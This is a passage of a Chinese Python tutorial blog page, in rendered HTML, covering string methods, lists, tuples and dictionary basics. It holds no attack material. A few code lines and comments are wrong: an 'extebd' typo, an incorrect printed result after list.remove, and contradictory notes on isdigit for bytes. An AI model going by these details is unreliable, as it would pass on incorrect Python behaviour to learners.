class="line"><span class="comment"># 判断字符串是否是由字母组成</span></span><br><span class="line">print(<span class="string">&#x27;abc&#x27;</span>.isalpha()) <span class="comment"># True</span></span><br><span class="line"><span class="comment"># 判断字符串是否由空格组成</span></span><br><span class="line">print(<span class="string">&quot;   &quot;</span>.isspace()) <span class="comment"># 带一个其他字符都为false</span></span><br><span class="line"><span class="comment"># 判断字符串是否符合标识符语法</span></span><br><span class="line">print(<span class="string">&#x27;1a&#x27;</span>.isidentifier()) <span class="comment"># False 内置标识符也是合法的</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 识别各类数字</span></span><br><span class="line"><span class="comment"># 在python3中</span></span><br><span class="line">num1 = <span class="string">b&#x27;4&#x27;</span> <span class="comment">#bytes</span></span><br><span class="line">num2 = <span class="string">u&#x27;4&#x27;</span> <span class="comment">#unicode,python3中无需加u就是unicode</span></span><br><span class="line">num3 = <span class="string">&#x27;四&#x27;</span> <span class="comment">#中文数字</span></span><br><span class="line">num4 = <span class="string">&#x27;Ⅳ&#x27;</span> <span class="comment">#罗马数字</span></span><br><span class="line"><span class="comment"># isdigit只能识别前两者</span></span><br><span class="line">print(num1.isdigit())   <span class="comment"># True</span></span><br><span class="line">print(num2.isdigit())   <span class="comment"># True</span></span><br><span class="line">print(num3.isdigit())   <span class="comment"># False</span></span><br><span class="line">print(num4.isdigit())   <span class="comment"># False</span></span><br><span class="line"><span class="comment"># isnumberic 此方法可以识别num2，num3，num4 并不能识别num1，num1直接报错</span></span><br><span class="line">print(num2.isnumeric())   <span class="comment"># True</span></span><br><span class="line">print(num3.isnumeric())   <span class="comment"># True</span></span><br><span class="line">print(num4.isnumeric())   <span class="comment"># True</span></span><br><span class="line"><span class="comment"># isdigit 只能识别num2,num1直接报错</span></span><br><span class="line">print(num2.isdigit()) <span class="comment"># True</span></span><br><span class="line">print(num3.isdigit()) <span class="comment"># False</span></span><br><span class="line">print(num4.isdigit()) <span class="comment"># False</span></span><br></pre></td></tr></table></figure><hr><h1 id="列表类型"><a href="#列表类型" class="headerlink" title="列表类型"></a>列表类型</h1><p>用于按位置存储多个任意类型的值，并且通过索引对应值(通常存放可归纳到一起的值，比如多个人的信息)</p><h2 id="定义-3"><a href="#定义-3" class="headerlink" title="定义"></a>定义</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">l = [<span class="number">1</span>,<span class="number">1.2</span>,<span class="string">&#x27;abc&#x27;</span>,[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]]</span><br><span class="line">l = list([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>]) <span class="comment"># 此功能也是进行数据转换的功能</span></span><br></pre></td></tr></table></figure><h2 id="类型转换-3"><a href="#类型转换-3" class="headerlink" title="类型转换"></a>类型转换</h2><p>但凡能够被for循环遍历的类型都可以作为参数传给list进行类型转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">print(list(<span class="string">&#x27;hello&#x27;</span>)) <span class="comment"># [&#x27;h&#x27;, &#x27;e&#x27;, &#x27;l&#x27;, &#x27;l&#x27;, &#x27;o&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环字典取的是字典的key </span></span><br><span class="line"><span class="comment"># 字典是无序的，python3会按顺序显示，python2不会按顺序显示</span></span><br><span class="line"><span class="comment"># python有模块将其变为有序，但默认是无序的</span></span><br><span class="line">print(list(&#123;<span class="string">&#x27;k1&#x27;</span>:<span class="number">111</span>,<span class="string">&#x27;k2&#x27;</span>:<span class="number">222</span>,<span class="string">&#x27;k3&#x27;</span>:<span class="number">333</span>&#125;)) <span class="comment"># 字典转列表，取值为key值 [&#x27;k1&#x27;, &#x27;k2&#x27;, &#x27;k3&#x27;]</span></span><br></pre></td></tr></table></figure><h2 id="内置方法"><a href="#内置方法" class="headerlink" title="内置方法"></a>内置方法</h2><h3 id="按索引取、改、增、插、值"><a href="#按索引取、改、增、插、值" class="headerlink" title="按索引取、改、增、插、值"></a>按索引取、改、增、插、值</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">l = [<span class="string">&#x27;kinght&#x27;</span>,<span class="number">22</span>,<span class="number">180</span>]</span><br><span class="line"><span class="comment"># 正向取</span></span><br><span class="line">print(l[<span class="number">0</span>]) <span class="comment"># kinght</span></span><br><span class="line"><span class="comment"># 反向取</span></span><br><span class="line">print(l[<span class="number">-2</span>]) <span class="comment"># 22</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改值</span></span><br><span class="line">l[<span class="number">2</span>] = <span class="number">183</span> <span class="comment"># 索引存在则修改值</span></span><br><span class="line"><span class="comment"># l[3] = 80 # 无论取还是赋值，索引不存在则报错</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加值，往列表末尾加值</span></span><br><span class="line">l.append(<span class="number">333</span>)</span><br><span class="line">print(l) <span class="comment"># [&#x27;kinght&#x27;, 22, 183, 333]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 插入值，往列表中间插入</span></span><br><span class="line"><span class="comment"># 把&#x27;lbg&#x27;插入列表成为2好索引</span></span><br><span class="line">l.insert(<span class="number">2</span>,<span class="string">&#x27;lbg&#x27;</span>)</span><br><span class="line">print(l) <span class="comment"># [&#x27;kinght&#x27;, 22, &#x27;lbg&#x27;, 183, 333]</span></span><br></pre></td></tr></table></figure><h3 id="删除值"><a href="#删除值" class="headerlink" title="删除值"></a>删除值</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除值</span></span><br><span class="line"><span class="comment"># 方式一：通用删除方法，没有返回值，只是单纯的删除</span></span><br><span class="line">l = [<span class="string">&#x27;kinght&#x27;</span>,<span class="number">22</span>,<span class="number">183</span>]</span><br><span class="line"><span class="keyword">del</span> l[<span class="number">1</span>]</span><br><span class="line"><span class="comment"># x = del l[2] # 因为没有返回值，不支持赋值语法</span></span><br><span class="line">print(l) <span class="comment"># [&#x27;kinght&#x27;, 183]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法二：l.pop() 根据索引删除，会返回被删除值</span></span><br><span class="line">l = [<span class="string">&#x27;kinght&#x27;</span>,<span class="number">22</span>,<span class="number">183</span>]</span><br><span class="line">l.pop() <span class="comment"># 不指定索引,默认删除最后一个</span></span><br><span class="line">print(l) <span class="comment"># [&#x27;kinght&#x27;, 22]</span></span><br><span class="line"><span class="comment"># 重置值</span></span><br><span class="line">l = [<span class="string">&#x27;kinght&#x27;</span>,<span class="number">22</span>,<span class="number">183</span>]</span><br><span class="line">res = l.pop(<span class="number">1</span>) <span class="comment"># 删除索引为1的值,并且将被删除值返回</span></span><br><span class="line">print(l) <span class="comment"># [&#x27;kinght&#x27;, 183]</span></span><br><span class="line">print(res) <span class="comment"># 22</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 方式三: l.remove() 根据元素进行删除,返回None</span></span><br><span class="line">l = [<span class="string">&#x27;kinght&#x27;</span>,<span class="number">22</span>,<span class="number">183</span>,[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],<span class="number">22</span>]</span><br><span class="line">l.remove(<span class="number">22</span>) <span class="comment"># 删除值为22的元素，如果重复删除从左至右第一个</span></span><br><span class="line">print(l) <span class="comment"># [&#x27;kinght&#x27;, 183, [1, 2, 3]]</span></span><br><span class="line">l.remove([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]) <span class="comment"># 此方法可删除列表</span></span><br><span class="line">print(l) <span class="comment"># [&#x27;kinght&#x27;, 183]</span></span><br></pre></td></tr></table></figure><h3 id="合并两个列表"><a href="#合并两个列表" class="headerlink" title="合并两个列表"></a>合并两个列表</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 合并两个列表</span></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">b = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 错误实现-会导致列表嵌套</span></span><br><span class="line">a.append(b)</span><br><span class="line">print(a) <span class="comment"># [1, 2, 3, [4, 5, 6]]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 实现方式</span></span><br><span class="line"><span class="comment"># 复杂 实现方式(不推荐使用)</span></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">b = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> b:</span><br><span class="line">    a.append(x)</span><br><span class="line">print(a) <span class="comment"># [1, 2, 3, 4, 5, 6]</span></span><br><span class="line"><span class="comment"># python优化方案extend</span></span><br><span class="line"><span class="comment"># extend的实现原理其实就是上方的复杂方式</span></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">b = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">a.extend(b)</span><br><span class="line">a.extebd(<span class="string">&#x27;abc&#x27;</span>) <span class="comment"># 字符串加入会默认拆分成列表</span></span><br><span class="line">print(a) <span class="comment"># [1, 2, 3, 4, 5, 6, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]</span></span><br></pre></td></tr></table></figure><h3 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">l = [<span class="number">111</span>,<span class="string">&#x27;kinght&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>,<span class="string">&#x27;world&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="comment"># 正向切片</span></span><br><span class="line">print(l[<span class="number">0</span>:<span class="number">3</span>]) <span class="comment"># [111, &#x27;kinght&#x27;, &#x27;hello&#x27;]</span></span><br><span class="line"><span class="comment"># 正向切片加步长</span></span><br><span class="line">print(l[<span class="number">0</span>:<span class="number">5</span>:<span class="number">2</span>]) <span class="comment"># [111, &#x27;hello&#x27;, &#x27;a&#x27;]</span></span><br><span class="line"><span class="comment"># 完整切片 切片是一种拷贝行为</span></span><br><span class="line">print(l[<span class="number">0</span>:len(l)]) <span class="comment"># len(l) 表示l的长度</span></span><br><span class="line">print(l[:]) <span class="comment"># [111, &#x27;kinght&#x27;, &#x27;hello&#x27;, &#x27;world&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]</span></span><br><span class="line">new_l = l[:] <span class="comment"># 相当于浅拷贝 如果有嵌套，只拷贝最外层列表，内层的地址是直接继承</span></span><br><span class="line"><span class="comment"># 反向完整切片</span></span><br><span class="line">print(l[::<span class="number">-1</span>]) <span class="comment"># [&#x27;c&#x27;, &#x27;b&#x27;, &#x27;a&#x27;, &#x27;world&#x27;, &#x27;hello&#x27;, &#x27;kinght&#x27;, 111]</span></span><br></pre></td></tr></table></figure><h3 id="统计长度"><a href="#统计长度" class="headerlink" title="统计长度"></a>统计长度</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">print(len(a)) <span class="comment"># 3</span></span><br></pre></td></tr></table></figure><h3 id="成员运算in和not-in"><a href="#成员运算in和not-in" class="headerlink" title="成员运算in和not in"></a>成员运算in和not in</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">&#x27;aaa&#x27;</span> <span class="keyword">in</span> [<span class="string">&#x27;aaa&#x27;</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]) <span class="comment"># True</span></span><br><span class="line">print(<span class="string">&#x27;bbb&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;bbb&#x27;</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]) <span class="comment"># False</span></span><br></pre></td></tr></table></figure><h3 id="统计元素个数、查找元素索引、清理所有元素、列表反转、列表排序"><a href="#统计元素个数、查找元素索引、清理所有元素、列表反转、列表排序" class="headerlink" title="统计元素个数、查找元素索引、清理所有元素、列表反转、列表排序"></a>统计元素个数、查找元素索引、清理所有元素、列表反转、列表排序</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;aaa&#x27;</span>,<span class="string">&#x27;bbb&#x27;</span>,<span class="string">&#x27;ccc&#x27;</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># a.count 统计元素在列表中出现多少次</span></span><br><span class="line">print(a.count(<span class="number">1</span>)) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># a.index 查找某一元素索引</span></span><br><span class="line">print(a.index(<span class="string">&#x27;bbb&#x27;</span>)) <span class="comment"># 4 找不到报错</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># a.clear 清理掉所有列表的元素</span></span><br><span class="line">a.clear()</span><br><span class="line">print(a) <span class="comment"># [] 列表内没有了元素</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># a.reverse 将列表反转，不是排序，只是单纯把列表倒过来</span></span><br><span class="line">a = [<span class="string">&#x27;aaa&#x27;</span>,<span class="string">&#x27;bbb&#x27;</span>,<span class="string">&#x27;ccc&#x27;</span>]</span><br><span class="line">a.reverse() <span class="comment"># 直接修改原列表</span></span><br><span class="line">print(a) <span class="comment"># [&#x27;ccc&#x27;, &#x27;bbb&#x27;, &#x27;aaa&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># l.sort 排序 列表内元素必须是同种类型</span></span><br><span class="line">l=[<span class="number">7</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">3</span>]</span><br><span class="line"><span class="comment"># 参数 ： l.sort(key=,reverse=) reverse为反转</span></span><br><span class="line"><span class="comment"># 此函数默认为升序</span></span><br><span class="line">l.sort()</span><br><span class="line">print(l) <span class="comment"># [1, 2, 3, 4, 7]</span></span><br><span class="line"><span class="comment"># l.sort(reverse=True) 反转为真即为降序</span></span><br><span class="line">l.sort(reverse=<span class="literal">True</span>)</span><br><span class="line">print(l) <span class="comment"># [7, 4, 3, 2, 1]</span></span><br><span class="line"><span class="comment"># 字符比较大小</span></span><br><span class="line">a=[<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;z&#x27;</span>] <span class="comment"># 字符串可以比较大小(根据ASCI码表)</span></span><br><span class="line">a.sort()</span><br><span class="line">print(a) <span class="comment"># [&#x27;q&#x27;, &#x27;s&#x27;, &#x27;z&#x27;]</span></span><br><span class="line"><span class="comment"># 字符串比较大小</span></span><br><span class="line"><span class="comment"># 字符串比较大小是从左至右按位比较</span></span><br><span class="line">b=[<span class="string">&#x27;cbcd&#x27;</span>,<span class="string">&#x27;acsd&#x27;</span>,<span class="string">&#x27;bdea&#x27;</span>,<span class="string">&#x27;abcd&#x27;</span>]</span><br><span class="line">b.sort()</span><br><span class="line">print(b) <span class="comment"># [&#x27;abcd&#x27;, &#x27;acsd&#x27;, &#x27;bdea&#x27;, &#x27;cbcd&#x27;]</span></span><br><span class="line"><span class="comment"># 第一位 a&gt;b 则放于前，若a=b,则跳转到第二位，依次类推</span></span><br><span class="line"><span class="comment"># 列表之间比较大小</span></span><br><span class="line">l1 = [<span class="number">1</span>,<span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line">l2 = [<span class="number">5</span>,<span class="string">&#x27;abcd&#x27;</span>,<span class="string">&#x27;cdw&#x27;</span>,<span class="string">&#x27;asc&#x27;</span>]</span><br><span class="line">print(l1&gt;l2) <span class="comment"># False</span></span><br><span class="line"><span class="comment"># 列表比大小与字符串类似，都是按位比较，但是对应位置的类型都必须是同种类型</span></span><br></pre></td></tr></table></figure><hr><h1 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h1><p>元组就是一个不可变的“列表”，按照索引位置存放多个值，只用于取不用于改</p><h2 id="定义-4"><a href="#定义-4" class="headerlink" title="定义"></a>定义</h2><p>使用小括号定义，用逗号分隔开多个任意类型的元素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">t = (<span class="number">1</span>,<span class="number">1.3</span>,<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">print(type(t),t) <span class="comment"># &lt;class &#x27;tuple&#x27;&gt; (1, 1.3, &#x27;aaa&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于小括号具有包含的特殊意义，故若只有一个元素，会被默认为包含</span></span><br><span class="line">x = (<span class="number">1</span>)</span><br><span class="line">print(type(x)) <span class="comment"># &lt;class &#x27;int&#x27;&gt; # 这里被当成了整型</span></span><br><span class="line"><span class="comment"># 定义一个元素的元组需要使用逗号</span></span><br><span class="line">x = (<span class="number">1</span>,) <span class="comment"># 使用,表明他是元组</span></span><br><span class="line">print(type(x)) <span class="comment"># &lt;class &#x27;tuple&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h3 id="元组不可变"><a href="#元组不可变" class="headerlink" title="元组不可变"></a>元组不可变</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">t = (<span class="number">111</span>,<span class="number">11.2</span>,<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line"><span class="comment"># 元组对应内存地址</span></span><br><span class="line"><span class="comment">## 1号索引 -&gt; 111的内存地址</span></span><br><span class="line"><span class="comment">## 2号索引 -&gt; 11.2的内存地址</span></span><br><span class="line"><span class="comment">## 3号索引 -&gt; &#x27;aaa&#x27;的内存地址</span></span><br><span class="line"><span class="comment">## 这里的修改值，会导致内存地址被修改，故会报错</span></span><br><span class="line"><span class="comment"># 但是，元组内如果有列表等间接引用内存地址的值</span></span><br><span class="line">t = (<span class="number">111</span>,<span class="number">11.2</span>,[<span class="string">&#x27;aaa&#x27;</span>,<span class="string">&#x27;bbbb&#x27;</span>])</span><br><span class="line">print(id(t)) <span class="comment"># 修改之前的元组内存地址 19627912</span></span><br><span class="line">t[<span class="number">2</span>][<span class="number">1</span>] = <span class="string">&#x27;ccc&#x27;</span></span><br><span class="line">print(id(t)) <span class="comment"># 修改之后的元组内存地址 19627912</span></span><br><span class="line">print(t) <span class="comment"># (111, 11.2, [&#x27;aaa&#x27;, &#x27;ccc&#x27;])</span></span><br><span class="line"><span class="comment"># 由于这里是间接引用，修改的是列表索引2所对应的内存地址，并没有修改元组所对应的列表内存地址，所以这里是能够修改的</span></span><br></pre></td></tr></table></figure><h2 id="类型转换-4"><a href="#类型转换-4" class="headerlink" title="类型转换"></a>类型转换</h2><p>类型转换和列表类似</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(tuple(<span class="string">&#x27;hello&#x27;</span>)) <span class="comment"># (&#x27;h&#x27;, &#x27;e&#x27;, &#x27;l&#x27;, &#x27;l&#x27;, &#x27;o&#x27;)</span></span><br><span class="line">print(tuple([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])) <span class="comment"># (1, 2, 3)</span></span><br><span class="line">print(tuple(&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">123</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">456</span>,<span class="string">&#x27;c&#x27;</span>:<span class="number">567</span>&#125;)) <span class="comment"># (&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;)</span></span><br></pre></td></tr></table></figure><h2 id="内置方法-1"><a href="#内置方法-1" class="headerlink" title="内置方法"></a>内置方法</h2><p>元组的内置方法与列表是一样的，只是由于元组不可变，比列表少了几个增删改的操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">t = (<span class="number">111</span>,<span class="string">&#x27;kinght&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>,<span class="string">&#x27;world&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"><span class="comment"># 正向取</span></span><br><span class="line">print(t[<span class="number">0</span>]) <span class="comment"># 111</span></span><br><span class="line"><span class="comment"># 反向取</span></span><br><span class="line">print(t[<span class="number">-2</span>]) <span class="comment"># b</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 切片</span></span><br><span class="line"><span class="comment">## 正向切片</span></span><br><span class="line">print(t[<span class="number">0</span>:<span class="number">3</span>]) <span class="comment"># (111, &#x27;kinght&#x27;, &#x27;hello&#x27;)</span></span><br><span class="line"><span class="comment">## 正向切片加步长</span></span><br><span class="line">print(t[<span class="number">0</span>:<span class="number">5</span>:<span class="number">2</span>]) <span class="comment"># (111, &#x27;hello&#x27;, &#x27;a&#x27;)</span></span><br><span class="line"><span class="comment">## 完整切片 切片是一种拷贝行为</span></span><br><span class="line">print(t[<span class="number">0</span>:len(t)]) <span class="comment"># len(l) 表示l的长度</span></span><br><span class="line">print(t[:]) <span class="comment"># 111, (&#x27;kinght&#x27;, &#x27;hello&#x27;, &#x27;world&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;)</span></span><br><span class="line">new_t = t[:] <span class="comment"># 相当于浅拷贝 如果有嵌套，只拷贝最外层列表，内层的地址是直接继承</span></span><br><span class="line"><span class="comment">## 反向完整切片</span></span><br><span class="line">print(t[::<span class="number">-1</span>]) <span class="comment"># (&#x27;c&#x27;, &#x27;b&#x27;, &#x27;a&#x27;, &#x27;world&#x27;, &#x27;hello&#x27;, &#x27;kinght&#x27;, 111)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 长度</span></span><br><span class="line">print(len(t)) <span class="comment"># 7</span></span><br><span class="line"><span class="comment"># 成员运算in和not in</span></span><br><span class="line">print(<span class="string">&#x27;aaa&#x27;</span> <span class="keyword">in</span> (<span class="string">&#x27;aaa&#x27;</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)) <span class="comment"># True</span></span><br><span class="line">print(<span class="string">&#x27;bbb&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;bbb&#x27;</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)) <span class="comment"># False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> t:</span><br><span class="line">    print(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计元素出现次数</span></span><br><span class="line">print(t.count(<span class="number">111</span>)) <span class="comment"># 1</span></span><br><span class="line"><span class="comment"># 查找某一元素索引</span></span><br><span class="line">print(t.index(<span class="string">&#x27;kinght&#x27;</span>)) <span class="comment"># 1</span></span><br></pre></td></tr></table></figure><hr><h1 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h1><p>用来记录多个值，使用<code>key：value</code>对应值</p><h2 id="定义-5"><a href="#定义-5" class="headerlink" title="定义"></a>定义</h2><p>使用<code>&#123;&#125;</code>使用<code>key：value</code>对应多个值，使用逗号分隔</p><p>其中<code>key</code>必须是不可变类型，且不能重复(key只保留后面一个，会覆盖点前面的key)，而<code>value</code>可以是任意值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;<span class="number">111</span>:<span class="number">111</span>,<span class="string">&#x27;k1&#x27;</span>:<span class="number">222</span>,(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>):<span class="number">333</span>&#125;</span><br><span class="line"><span class="comment"># 字典的key必须是不可变类型</span></span><br><span class="line">print(d[<span class="number">111</span>]) <span class="comment"># 111</span></span><br><span class="line">print(d[<span class="string">&#x27;k1&#x27;</span>]) <span class="comment"># 222</span></span><br><span class="line">print(d[(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)]) <span class="comment"># 333</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义字典的第二种方式</span></span><br><span class="line">d3 = dict(x=<span class="number">1</span>,y=<span class="number">2</span>,z=<span class="number">3</span>)</span><br><span class="line">print(d3) <span class="comment"># &#123;&#x27;x&#x27;: 1, &#x27;y&#x27;: 2, &#x27;z&#x27;: 3&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义空字典</span></span><br><span class="line">d1 = &#123;&#125; <span class="comment"># 空的花括号默认的是字典</span></span><br><span class="line">print(type(d1)) <span class="comment"># &lt;class &#x27;dict&#x27;&gt;</span></span><br><span class="line">d2 = dict()</span><br><span class="line">print(type(d2)) <span class="comment"># &lt;class &#x27;dict&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h2 id="类型转换-5"><a href="#类型转换-5" class="headerlink" title="类型转换"></a>类型转换</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 